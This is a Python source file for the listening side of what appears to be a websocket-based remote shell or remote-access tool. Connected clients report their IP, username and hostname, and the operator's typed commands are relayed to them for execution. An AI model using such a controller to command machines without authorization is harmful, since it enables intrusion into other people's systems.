
import os
import json
import asyncio

from subprocess import call

from functools import partial
from websockets import serve, exceptions

from ..plugins.host_controller_plugins import *

####################################################################################################

class Host:
	def __init__(self, host, port, encryption_key) -> None:
		self.host = host
		self.port = port
		self.client = None
		self.websocket = None
		self.plugins = {
			'decrypt' : partial(decrypt, encryption_key),
			'encrypt' : partial(encrypt, encryption_key),
		}


	async def run(self):
		self.clear()
		async with serve(self.client_connected, self.host, self.port, ping_interval=10):
			print(f"listening for client on {self.host} port {self.port}...")
			await asyncio.Future()


	async def client_connected(self, websocket) -> None:
		self.websocket = websocket
		self.clear()
		self.client = await self.listen()
		print(f"Client {self.client['ip']} connected!\n")
		try:
			async for message in self.websocket:
				cwd = json.loads(message)['content']
				command = input(self.terminal_prompt(cwd))
				# Parse user command to json
				command = self.parse_command(command)
				# Send user command to client
				await self.send(command)
				output = await self.listen()
				if output:
					print(f"{output}\n")

		except exceptions.ConnectionClosedError as e:
			self.clear()
			print(f"[ client {self.client['ip']} disconnected ]")
			print(f"{e}\n")
			print("waiting for client...")
			return False

	

	async def send(self, command_json:dict) -> None:
		"""
		Sends a command json via websocket to a connected client
		"""
		await self.websocket.send(json.dumps(command_json))


	def parse_command(self, command:str) -> dict:
		"""
		Checking if command to be sent requires additional action or modification
			by the host before being sent to the client.

		Decision is based on if the command keyword is assigned a function in
			self.plugins
		"""
		if not command.strip():
			command = ""
		# first word of command is the 'keyword'
		command_list = command.split()
		keyword = command_list[0]
		args = None if len(command_list) < 2 else command_list[1:]
		# if the keyword wasnt blank and keyword exists in self.plugins command dict
		if keyword and keyword in self.plugins:
			# run associated command function with the entire command string
			# 	as the argument and store returned command json result
			command_dict = self.plugins[keyword](args)
		else:
			# convert command string to json that the client can accept
			command_dict = self.command_to_dict(command)
		return command_dict


	def command_to_dict(self, command:str) -> dict:
		"""
		Takes in a command string to be executed & converts it to json:
			"command args" -> "{'command':command_keyword, 'args':[args]}"			
		"""
		command = command.split()
		command_dict = {
			'keyword':command[0],
			'args':None
		}
		# if command has args
		if len(command) > 1:
			# append a blank arg to the command list
			command_dict['args'] = command[1:]
		
		return command_dict


	async def listen(self) -> dict:
		"""
		Data received from client is expected to be a string in json format -> "{'key':'val'}"
		"""
		try:
			data = await self.websocket.recv()
			return json.loads(data)['content']
		except (exceptions.ConnectionClosedError, exceptions.ConnectionClosedOK) as e:
			self.clear()
			print(f"[ socket {self.client['ip']} closed ]")
			print(f"{e}\n")
			print("waiting for client...")

	def terminal_prompt(self, directory) -> str:
		return f"{self.client['username']}@{self.client['hostname']}:{directory} $> "

	def clear(self):
		# check and make call for specific operating system
		_ = call('clear' if os.name == 'posix' else 'cls')